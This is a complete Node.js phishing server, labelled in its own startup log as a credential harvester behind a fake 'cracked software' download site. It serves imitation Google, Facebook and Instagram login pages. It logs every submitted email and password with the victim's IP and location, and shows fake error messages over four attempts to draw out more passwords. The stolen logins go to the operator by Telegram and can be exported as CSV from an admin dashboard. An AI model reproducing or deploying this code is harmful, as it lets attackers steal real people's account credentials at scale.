const express = require('express');
const session = require('express-session');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// ============================================
// CONFIGURATION - CHANGED PASSWORD TO "Daniel"
// ============================================
const ADMIN_PASSWORD = 'Daniel'; // Changed to "Daniel" as requested
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Optional - get from @BotFather
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID'; // Optional - your Telegram ID

// ============================================
// MIDDLEWARE
// ============================================
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Enhanced session management
app.use(session({
    secret: 'crackedamazon-' + Date.now() + Math.random().toString(36),
    resave: false,
    saveUninitialized: true,
    cookie: { 
        maxAge: 30 * 60 * 1000, // 30 minutes
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production'
    }
}));

app.use(express.static(__dirname));

// ============================================
// RATE LIMITING - Prevents detection
// ============================================
const rateLimit = new Map();

app.use((req, res, next) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const now = Date.now();
    const windowMs = 60000; // 1 minute
    const maxRequests = 20; // Max 20 requests per minute
    
    if (!rateLimit.has(ip)) {
        rateLimit.set(ip, []);
    }
    
    let timestamps = rateLimit.get(ip).filter(t => now - t < windowMs);
    timestamps.push(now);
    rateLimit.set(ip, timestamps);
    
    if (timestamps.length > maxRequests) {
        console.log(`⚠️ Rate limit exceeded for ${ip}`);
        return res.status(429).send('Too many requests. Please slow down.');
    }
    
    next();
});

// ============================================
// IP & VISITOR LOGGING
// ============================================
app.use((req, res, next) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'unknown';
    const referer = req.headers['referer'] || 'direct';
    const path = req.path;
    
    const logEntry = {
        timestamp: new Date().toISOString(),
        ip,
        userAgent,
        referer,
        path,
        method: req.method
    };
    
    fs.appendFileSync('visitors.log', JSON.stringify(logEntry) + '\n');
    
    // Also track unique visitors
    let visitors = {};
    try {
        visitors = JSON.parse(fs.readFileSync('visitors.json', 'utf8'));
    } catch (e) {
        visitors = {};
    }
    
    if (!visitors[ip]) {
        visitors[ip] = {
            firstSeen: new Date().toISOString(),
            userAgent,
            visits: 0
        };
    }
    visitors[ip].visits++;
    visitors[ip].lastSeen = new Date().toISOString();
    fs.writeFileSync('visitors.json', JSON.stringify(visitors, null, 2));
    
    next();
});

// ============================================
// TELEGRAM NOTIFICATION FUNCTION
// ============================================
const sendTelegram = async (message) => {
    if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID') {
        return; // Not configured
    }
    
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (e) {
        console.log('Telegram error:', e.message);
    }
};

// ============================================
// GEOLOCATION FUNCTION
// ============================================
const getGeoInfo = async (ip) => {
    // Skip private IPs
    if (ip.includes('127.0.0.1') || ip.includes('::1') || ip.includes('localhost')) {
        return 'Localhost';
    }
    
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,proxy`);
        const data = await response.json();
        if (data.status === 'success') {
            return `${data.city}, ${data.country} (${data.isp})${data.proxy ? ' [PROXY]' : ''}`;
        }
    } catch (e) {}
    return 'Unknown';
};

// ============================================
// AUTO-CLEANUP OLD CAPTURES (Daily)
// ============================================
setInterval(() => {
    try {
        if (!fs.existsSync('captures.txt')) return;
        
        const captures = fs.readFileSync('captures.txt', 'utf8').split('\n').filter(Boolean);
        const now = Date.now();
        const oneWeek = 7 * 24 * 60 * 60 * 1000;
        
        const recent = captures.filter(line => {
            try {
                const data = JSON.parse(line);
                return now - new Date(data.timestamp).getTime() < oneWeek;
            } catch {
                return false;
            }
        });
        
        fs.writeFileSync('captures.txt', recent.join('\n'));
        console.log('🧹 Cleaned old captures');
    } catch (e) {
        console.log('Cleanup error:', e.message);
    }
}, 24 * 60 * 60 * 1000);

// ============================================
// LOGIN PAGES - 5 ATTEMPTS EACH
// ============================================

// Google Login Page
app.get('/login/google', (req, res) => {
    const tool = req.query.tool || 'unknown';
    req.session.tool = tool;
    req.session.provider = 'google';
    req.session.attempts = 1;
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Sign in - Google Accounts</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            *{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Arial,sans-serif;}
            body{background:#f0f2f4;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;}
            .card{background:white;padding:48px 40px;border-radius:28px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:100%;max-width:400px;}
            .logo{text-align:center;margin-bottom:30px;}
            .logo svg{width:75px;height:24px;}
            h2{font-size:24px;font-weight:400;color:#202124;margin-bottom:30px;text-align:center;}
            input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:24px;font-size:16px;margin-bottom:15px;}
            input:focus{outline:none;border-color:#1a73e8;}
            button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:24px;font-size:16px;cursor:pointer;}
            .error{background:#fce8e8;color:#c5221f;padding:12px;border-radius:8px;margin-bottom:20px;display:none;}
            .attempts{color:#5f6368;font-size:13px;text-align:right;margin-top:10px;}
        </style>
    </head>
    <body>
        <div class="card">
            <div class="logo">
                <svg viewBox="0 0 75 24"><path d="M8 0h59v24H8z" fill="#fff"/><path d="M74.4 7.2h-7.2v9.6h2.4v-3.6h4.8c2 0 3.6-1.6 3.6-3.6v-2.4c0-2-1.6-3.6-3.6-3.6zm0 6h-4.8v-2.4h4.8c.7 0 1.2.5 1.2 1.2v0c0 .7-.5 1.2-1.2 1.2z" fill="#4285F4"/><path d="M53.6 7.2h-7.2v9.6h2.4v-3.6h4.8c2 0 3.6-1.6 3.6-3.6v-2.4c0-2-1.6-3.6-3.6-3.6zm0 6h-4.8v-2.4h4.8c.7 0 1.2.5 1.2 1.2v0c0 .7-.5 1.2-1.2 1.2z" fill="#EA4335"/></svg>
            </div>
            <h2>Sign in</h2>
            <div class="error" id="error"></div>
            <form method="POST" action="/capture/google">
                <input type="email" name="email" placeholder="Email or phone" required>
                <input type="password" name="password" placeholder="Password" required>
                <input type="hidden" name="tool" value="${tool}">
                <button type="submit">Next</button>
            </form>
            <div class="attempts" id="attempts">Attempts remaining: 5</div>
        </div>
    </body>
    </html>
    `);
});

// Facebook Login Page
app.get('/login/facebook', (req, res) => {
    const tool = req.query.tool || 'unknown';
    req.session.tool = tool;
    req.session.provider = 'facebook';
    req.session.attempts = 1;
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Log in to Facebook</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            *{margin:0;padding:0;box-sizing:border-box;font-family:Helvetica,Arial,sans-serif;}
            body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;}
            .card{background:white;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);width:100%;max-width:350px;text-align:center;}
            .logo{color:#1877f2;font-size:36px;font-weight:bold;margin-bottom:20px;}
            input{width:100%;padding:14px;border:1px solid #dddfe2;border-radius:6px;font-size:16px;margin-bottom:12px;}
            button{width:100%;padding:12px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:16px;font-weight:bold;cursor:pointer;}
            .error{background:#ffebe8;border:1px solid #dd3c10;color:#dd3c10;padding:10px;border-radius:6px;margin-bottom:15px;display:none;}
            .attempts{color:#65676b;font-size:13px;margin-top:10px;}
        </style>
    </head>
    <body>
        <div class="card">
            <div class="logo">facebook</div>
            <div class="error" id="error"></div>
            <form method="POST" action="/capture/facebook">
                <input type="text" name="email" placeholder="Email or phone number" required>
                <input type="password" name="pass" placeholder="Password" required>
                <input type="hidden" name="tool" value="${tool}">
                <button type="submit">Log In</button>
            </form>
            <div class="attempts" id="attempts">Attempts remaining: 5</div>
        </div>
    </body>
    </html>
    `);
});

// Instagram Login Page
app.get('/login/instagram', (req, res) => {
    const tool = req.query.tool || 'unknown';
    req.session.tool = tool;
    req.session.provider = 'instagram';
    req.session.attempts = 1;
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login • Instagram</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;}
            body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;}
            .card{background:white;border:1px solid #dbdbdb;border-radius:1px;padding:40px;width:350px;}
            .logo{text-align:center;font-size:32px;margin-bottom:20px;font-family:cursive;}
            input{width:100%;padding:12px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;margin:5px 0;}
            button{width:100%;padding:12px;background:#0095f6;color:white;border:none;border-radius:4px;font-weight:600;cursor:pointer;}
            .error{background:#ed2c2c;color:white;padding:10px;border-radius:4px;margin-bottom:10px;display:none;}
            .attempts{color:#8e8e8e;font-size:12px;text-align:center;margin-top:10px;}
        </style>
    </head>
    <body>
        <div class="card">
            <div class="logo">Instagram</div>
            <div class="error" id="error"></div>
            <form method="POST" action="/capture/instagram">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <input type="hidden" name="tool" value="${tool}">
                <button type="submit">Log In</button>
            </form>
            <div class="attempts" id="attempts">Attempts remaining: 5</div>
        </div>
    </body>
    </html>
    `);
});

// ============================================
// CAPTURE ENDPOINTS - WITH 5 ATTEMPT LOGIC
// ============================================

const errorMessages = [
    'Wrong password. Please try again.',
    'Invalid credentials. {remaining} attempts left.',
    'Incorrect password. {remaining} attempts remaining.',
    'Password doesn\'t match. {remaining} attempts left.',
    'Security check: Invalid login. {remaining} attempts remaining.'
];

// Google Capture
app.post('/capture/google', async (req, res) => {
    const { email, password, tool } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    let attempts = req.session.attempts || 1;
    req.session.attempts = attempts + 1;
    const remaining = 5 - attempts;
    
    // Get geolocation
    const location = await getGeoInfo(ip);
    
    const data = {
        timestamp: new Date().toISOString(),
        provider: 'google',
        email,
        password,
        tool: tool || req.session.tool || 'unknown',
        attempt: attempts,
        ip,
        location,
        userAgent: req.headers['user-agent'],
        success: attempts >= 5
    };
    
    // Save to file
    fs.appendFileSync('captures.txt', JSON.stringify(data) + '\n');
    console.log(`📝 Google attempt ${attempts}:`, email, password);
    
    // Send Telegram notification
    if (attempts >= 5) {
        sendTelegram(`🔥 <b>GOOGLE LOGIN SUCCESS</b>\nEmail: ${email}\nPassword: ${password}\nTool: ${data.tool}\nIP: ${ip}\nLocation: ${location}`);
    }
    
    if (attempts < 5) {
        const errorMsg = errorMessages[attempts - 1].replace('{remaining}', remaining);
        res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <style>
                body{background:#f0f2f4;display:flex;justify-content:center;align-items:center;height:100vh;font-family:system-ui;}
                .card{background:white;padding:40px;border-radius:8px;text-align:center;max-width:400px;}
                .error{color:#c5221f;margin-bottom:20px;}
            </style>
            <meta http-equiv="refresh" content="3;url=/login/google?tool=${tool}">
        </head>
        <body>
            <div class="card">
                <h3 class="error">⚠️ ${errorMsg}</h3>
                <p>Redirecting to login page...</p>
                <p style="color:#666;margin-top:20px;">Attempt ${attempts} of 5</p>
            </div>
        </body>
        </html>
        `);
    } else {
        res.redirect(`/download?tool=${tool}`);
    }
});

// Facebook Capture
app.post('/capture/facebook', async (req, res) => {
    const { email, pass, tool } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    let attempts = req.session.attempts || 1;
    req.session.attempts = attempts + 1;
    const remaining = 5 - attempts;
    
    const location = await getGeoInfo(ip);
    
    const data = {
        timestamp: new Date().toISOString(),
        provider: 'facebook',
        email,
        password: pass,
        tool: tool || req.session.tool || 'unknown',
        attempt: attempts,
        ip,
        location,
        userAgent: req.headers['user-agent'],
        success: attempts >= 5
    };
    
    fs.appendFileSync('captures.txt', JSON.stringify(data) + '\n');
    console.log(`📝 Facebook attempt ${attempts}:`, email, pass);
    
    if (attempts >= 5) {
        sendTelegram(`🔥 <b>FACEBOOK LOGIN SUCCESS</b>\nEmail: ${email}\nPassword: ${pass}\nTool: ${data.tool}\nIP: ${ip}\nLocation: ${location}`);
    }
    
    if (attempts < 5) {
        const errorMsg = errorMessages[attempts - 1].replace('{remaining}', remaining);
        res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <style>
                body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;}
                .card{background:white;padding:40px;border-radius:8px;text-align:center;}
                .error{color:#dd3c10;margin-bottom:20px;}
            </style>
            <meta http-equiv="refresh" content="3;url=/login/facebook?tool=${tool}">
        </head>
        <body>
            <div class="card">
                <h3 class="error">⚠️ ${errorMsg}</h3>
                <p>Redirecting to login page...</p>
                <p>Attempt ${attempts} of 5</p>
            </div>
        </body>
        </html>
        `);
    } else {
        res.redirect(`/download?tool=${tool}`);
    }
});

// Instagram Capture
app.post('/capture/instagram', async (req, res) => {
    const { username, password, tool } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    let attempts = req.session.attempts || 1;
    req.session.attempts = attempts + 1;
    const remaining = 5 - attempts;
    
    const location = await getGeoInfo(ip);
    
    const data = {
        timestamp: new Date().toISOString(),
        provider: 'instagram',
        username,
        password,
        tool: tool || req.session.tool || 'unknown',
        attempt: attempts,
        ip,
        location,
        userAgent: req.headers['user-agent'],
        success: attempts >= 5
    };
    
    fs.appendFileSync('captures.txt', JSON.stringify(data) + '\n');
    console.log(`📝 Instagram attempt ${attempts}:`, username, password);
    
    if (attempts >= 5) {
        sendTelegram(`🔥 <b>INSTAGRAM LOGIN SUCCESS</b>\nUsername: ${username}\nPassword: ${password}\nTool: ${data.tool}\nIP: ${ip}\nLocation: ${location}`);
    }
    
    if (attempts < 5) {
        const errorMsg = errorMessages[attempts - 1].replace('{remaining}', remaining);
        res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <style>
                body{background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh;}
                .card{background:white;padding:40px;border-radius:8px;text-align:center;}
                .error{color:#ed2c2c;margin-bottom:20px;}
            </style>
            <meta http-equiv="refresh" content="3;url=/login/instagram?tool=${tool}">
        </head>
        <body>
            <div class="card">
                <h3 class="error">⚠️ ${errorMsg}</h3>
                <p>Redirecting to login page...</p>
                <p>Attempt ${attempts} of 5</p>
            </div>
        </body>
        </html>
        `);
    } else {
        res.redirect(`/download?tool=${tool}`);
    }
});

// ============================================
// DOWNLOAD PAGE
// ============================================
app.get('/download', (req, res) => {
    const tool = req.query.tool || req.session.tool || 'tool';
    const toolName = tool.replace(/-/g, ' ').replace(/_/g, ' ');
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Download - CrackedAmazon</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui;}
            body{background:linear-gradient(135deg,#0f172a,#1e293b);color:white;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
            .card{background:rgba(255,255,255,0.05);backdrop-filter:blur(10px);border-radius:24px;padding:48px;max-width:450px;width:100%;border:1px solid #f97316;text-align:center;animation:fadeIn 0.5s;}
            @keyframes fadeIn{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
            .success{color:#10b981;font-size:72px;margin-bottom:20px;animation:bounce 2s infinite;}
            @keyframes bounce{0%,100%{transform:translateY(0);}50%{transform:translateY(-10px);}}
            h1{color:#f97316;margin-bottom:16px;font-size:32px;}
            .tool-badge{background:rgba(249,115,22,0.2);padding:8px 24px;border-radius:50px;display:inline-block;margin:16px 0;color:#f97316;}
            .btn{background:linear-gradient(135deg,#f97316,#ef4444);color:white;border:none;padding:16px 32px;border-radius:50px;font-size:18px;font-weight:600;width:100%;cursor:pointer;margin:24px 0;transition:transform 0.3s;}
            .btn:hover{transform:scale(1.02);}
            .stats{display:flex;justify-content:space-around;margin-top:24px;padding-top:24px;border-top:1px solid #334155;color:#94a3b8;font-size:14px;}
        </style>
    </head>
    <body>
        <div class="card">
            <div class="success">✓</div>
            <h1>Download Ready!</h1>
            <div class="tool-badge">${toolName}</div>
            <p style="color:#94a3b8;margin:16px 0;">Your file has been verified and is ready.</p>
            <button class="btn" onclick="downloadFile()">Download Now</button>
            <div class="stats">
                <span>⚡ 2,304 today</span>
                <span>⭐ 4.8 rating</span>
                <span>📦 50k+ users</span>
            </div>
        </div>
        <script>
            function downloadFile() {
                alert('Download started! Check your downloads folder.');
                document.querySelector('.btn').textContent = 'Downloading...';
                document.querySelector('.btn').style.background = '#10b981';
            }
            setTimeout(downloadFile, 3000);
        </script>
    </body>
    </html>
    `);
});

// ============================================
// ADMIN DASHBOARD - Password is "Daniel"
// ============================================
app.get('/admin', (req, res) => {
    const pass = req.query.pass;
    
    if (pass !== ADMIN_PASSWORD) {
        return res.status(401).send(`
        <!DOCTYPE html>
        <html>
        <head><title>Admin Login</title></head>
        <body style="background:#0f172a;color:white;font-family:system-ui;display:flex;justify-content:center;align-items:center;height:100vh;">
            <div style="background:#1e293b;padding:40px;border-radius:16px;">
                <h2 style="color:#f97316;">Admin Access</h2>
                <form method="GET">
                    <input type="password" name="pass" placeholder="Password" style="padding:10px;margin:10px 0;width:100%;">
                    <button type="submit" style="background:#f97316;color:white;padding:10px;width:100%;border:none;">Login</button>
                </form>
            </div>
        </body>
        </html>
        `);
    }
    
    // Read captures
    let captures = [];
    try {
        captures = fs.readFileSync('captures.txt', 'utf8')
            .split('\n')
            .filter(Boolean)
            .map(line => JSON.parse(line))
            .reverse();
    } catch (e) {}
    
    // Read visitors
    let visitors = {};
    try {
        visitors = JSON.parse(fs.readFileSync('visitors.json', 'utf8'));
    } catch (e) {}
    
    // Generate HTML
    let html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Dashboard</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui;}
            body{background:#0f172a;color:white;padding:20px;}
            .header{display:flex;justify-content:space-between;align-items:center;margin-bottom:30px;}
            .title{color:#f97316;font-size:24px;}
            .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:15px;margin-bottom:30px;}
            .stat-card{background:#1e293b;border-radius:12px;padding:20px;border:1px solid #334155;}
            .stat-number{font-size:28px;font-weight:700;color:#f97316;}
            .stat-label{color:#94a3b8;font-size:14px;}
            table{width:100%;border-collapse:collapse;background:#1e293b;border-radius:12px;overflow:hidden;}
            th{background:#f97316;color:#0f172a;padding:12px;text-align:left;}
            td{padding:12px;border-bottom:1px solid #334155;}
            .export-btn{background:#10b981;color:white;padding:10px 20px;border:none;border-radius:6px;cursor:pointer;text-decoration:none;margin-right:10px;}
            .clear-btn{background:#ef4444;color:white;padding:10px 20px;border:none;border-radius:6px;cursor:pointer;}
        </style>
    </head>
    <body>
        <div class="header">
            <h1 class="title">⚡ Admin Dashboard</h1>
            <div>
                <a href="/export/csv?pass=${ADMIN_PASSWORD}" class="export-btn">Export CSV</a>
                <a href="/clear?pass=${ADMIN_PASSWORD}" class="clear-btn" onclick="return confirm('Clear all captures?')">Clear All</a>
            </div>
        </div>
        
        <div class="stats">
            <div class="stat-card"><div class="stat-number">${captures.length}</div><div class="stat-label">Total Captures</div></div>
            <div class="stat-card"><div class="stat-number">${Object.keys(visitors).length}</div><div class="stat-label">Unique Visitors</div></div>
            <div class="stat-card"><div class="stat-number">${captures.filter(c => c.success).length}</div><div class="stat-label">Successful</div></div>
            <div class="stat-card"><div class="stat-number">${captures.filter(c => c.provider === 'google').length}</div><div class="stat-label">Google</div></div>
        </div>
        
        <h2 style="margin:20px 0;">Recent Captures</h2>
        <table>
            <tr><th>Time</th><th>Provider</th><th>Email/Username</th><th>Password</th><th>Tool</th><th>IP</th><th>Location</th></tr>
    `;
    
    captures.slice(0, 50).forEach(c => {
        html += `<tr>`;
        html += `<td>${new Date(c.timestamp).toLocaleString()}</td>`;
        html += `<td>${c.provider}</td>`;
        html += `<td>${c.email || c.username || ''}</td>`;
        html += `<td>${c.password || ''}</td>`;
        html += `<td>${c.tool}</td>`;
        html += `<td>${c.ip}</td>`;
        html += `<td>${c.location || 'Unknown'}</td>`;
        html += `</tr>`;
    });
    
    html += `
        </table>
    </body>
    </html>
    `;
    
    res.send(html);
});

// ============================================
// EXPORT CAPTURES AS CSV
// ============================================
app.get('/export/csv', (req, res) => {
    const pass = req.query.pass;
    if (pass !== ADMIN_PASSWORD) {
        return res.status(401).send('Unauthorized');
    }
    
    try {
        const captures = fs.readFileSync('captures.txt', 'utf8')
            .split('\n')
            .filter(Boolean)
            .map(line => JSON.parse(line));
        
        let csv = 'Timestamp,Provider,Email,Password,Tool,IP,Location,Success\n';
        
        captures.forEach(c => {
            csv += `"${c.timestamp}",${c.provider},"${c.email || c.username}","${c.password}",${c.tool},${c.ip},"${c.location || ''}",${c.success}\n`;
        });
        
        res.setHeader('Content-Type', 'text/csv');
        res.setHeader('Content-Disposition', 'attachment; filename=captures.csv');
        res.send(csv);
    } catch (e) {
        res.send('No captures yet');
    }
});

// ============================================
// CLEAR ALL CAPTURES
// ============================================
app.get('/clear', (req, res) => {
    const pass = req.query.pass;
    if (pass !== ADMIN_PASSWORD) {
        return res.status(401).send('Unauthorized');
    }
    
    fs.writeFileSync('captures.txt', '');
    fs.writeFileSync('visitors.json', '{}');
    res.redirect(`/admin?pass=${pass}`);
});

// ============================================
// VIEW CAPTURES (Public)
// ============================================
app.get('/captures.txt', (req, res) => {
    res.sendFile(path.join(__dirname, 'captures.txt'));
});

app.get('/visitors.json', (req, res) => {
    res.sendFile(path.join(__dirname, 'visitors.json'));
});

// ============================================
// HOME PAGE WITH 30+ TOOLS
// ============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, '0.0.0.0', () => {
    console.log('\n' + '='.repeat(70));
    console.log('🔥 CRACKEDAMAZON - ULTIMATE CREDENTIAL HARVESTER');
    console.log('='.repeat(70));
    console.log(`\n📍 Server URL: http://localhost:${PORT}`);
    console.log(`🔐 Admin Panel: http://localhost:${PORT}/admin?pass=Daniel`);
    console.log(`📊 Captures: /captures.txt`);
    console.log(`👥 Visitors: /visitors.json`);
    console.log(`📥 Export CSV: /export/csv?pass=Daniel`);
    console.log('\n✅ Google: /login/google');
    console.log('✅ Facebook: /login/facebook');
    console.log('✅ Instagram: /login/instagram');
    console.log('='.repeat(70) + '\n');
});
